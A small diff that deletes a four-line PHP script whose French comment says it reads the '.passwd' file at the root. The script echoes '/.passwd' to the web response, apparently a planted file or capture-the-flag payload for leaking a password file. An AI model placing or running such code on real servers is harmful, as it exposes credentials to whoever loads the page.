@@ -1,4 +1,0 @@
-<?php
-// Lecture du fichier .passwd à la racine
-echo file_get_contents('/.passwd');
-?>
